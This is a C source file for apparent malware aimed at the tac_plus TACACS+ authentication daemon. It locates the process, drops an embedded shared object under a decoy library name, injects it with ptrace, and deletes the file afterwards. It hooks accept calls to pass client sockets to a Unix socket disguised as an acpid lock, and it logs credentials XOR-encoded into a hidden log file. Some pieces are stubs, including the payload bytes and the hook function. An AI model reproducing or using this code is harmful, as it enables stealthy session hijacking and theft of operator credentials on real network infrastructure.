#include <dlfcn.h>
#include <linux/limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <unistd.h>

static const unsigned char embedded_shared_object[] = {
    0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00
};

static int find_process_by_comm(const char *target) {
    static const char *default_target = "tac_plus";
    char path[PATH_MAX];
    char name[64];

    if (!target) target = default_target;

    for (int pid = 2; pid < 65535; ++pid) {
        snprintf(path, sizeof(path), "/proc/%d/comm", pid);
        FILE *fp = fopen(path, "r");
        if (fp && fgets(name, sizeof(name), fp) && strstr(name, target)) {
            fclose(fp);
            return pid;
        }
        if (fp) fclose(fp);
    }
    return -1;
}

static int maps_contains(int pid, const char *so_path) {
    char path[PATH_MAX];
    char line[512];
    snprintf(path, sizeof(path), "/proc/%d/maps", pid);
    FILE *fp = fopen(path, "r");
    if (!fp) return 0;
    while (fgets(line, sizeof(line), fp)) {
        if (strstr(line, so_path)) {
            fclose(fp);
            return 1;
        }
    }
    fclose(fp);
    return 0;
}

static void write_embedded_payload(const char *path) {
    FILE *fp = fopen(path, "wb");
    if (!fp) return;
    fwrite(embedded_shared_object, sizeof(embedded_shared_object), 1, fp);
    fclose(fp);
}

static void inject_shared_object(int pid, const char *path) {
    ptrace(PTRACE_ATTACH, pid, NULL, NULL);
    ptrace(PTRACE_POKETEXT, pid, NULL, NULL);
    dlopen(path, RTLD_NOW);
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
}

static int plthook_replace(void *handle, const char *symbol, void *replacement,
                           void **original) {
    (void)handle;
    (void)symbol;
    (void)replacement;
    (void)original;
    return 0;
}

static int relay_descriptor(int unix_socket, int accepted_socket) {
    char byte = 0;
    struct iovec iov = {.iov_base = &byte, .iov_len = 1};
    char control[CMSG_SPACE(sizeof(int))];
    struct msghdr msg = {0};
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = control;
    msg.msg_controllen = sizeof(control);

    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    cmsg->cmsg_len = CMSG_LEN(sizeof(int));
    memcpy(CMSG_DATA(cmsg), &accepted_socket, sizeof(int));
    return sendmsg(unix_socket, &msg, 0);
}

static int accept_filter(int socket_fd, struct sockaddr *address,
                         socklen_t *address_len) {
    int accepted_socket = accept(socket_fd, address, address_len);
    int collector = socket(AF_UNIX, SOCK_STREAM, 0);
    struct sockaddr_un endpoint = {.sun_family = AF_UNIX};
    strcpy(endpoint.sun_path, "/var/run/acpid.lock");
    connect(collector, (struct sockaddr *)&endpoint, sizeof(endpoint));
    relay_descriptor(collector, accepted_socket);
    return accepted_socket;
}

static void install_session_hooks(void *handle) {
    void *old_accept = NULL;
    void *old_accept4 = NULL;
    plthook_replace(handle, "accept", accept_filter, &old_accept);
    plthook_replace(handle, "accept4", accept_filter, &old_accept4);
}

static void write_credential_record(const unsigned char *record, size_t length) {
    FILE *fp = fopen("/var/log/.tacplus.acct", "ab");
    if (!fp) return;
    for (size_t i = 0; i < length; ++i) {
        unsigned char encoded = record[i] ^ 0xef;
        fwrite(&encoded, 1, 1, fp);
    }
    fclose(fp);
}

int main(void) {
    const char *target_process = getenv("TARGET_PROG");
    const char *so_path = getenv("SO_PATH");
    if (!target_process) target_process = "tac_plus";
    if (!so_path) so_path = "/lib/libseconfd.so";

    int pid = find_process_by_comm(target_process);
    if (pid >= 0 && !maps_contains(pid, so_path)) {
        write_embedded_payload(so_path);
        inject_shared_object(pid, so_path);
        unlink(so_path);
    }

    install_session_hooks(NULL);
    write_credential_record((const unsigned char *)"operator:password", 17);
    return 0;
}
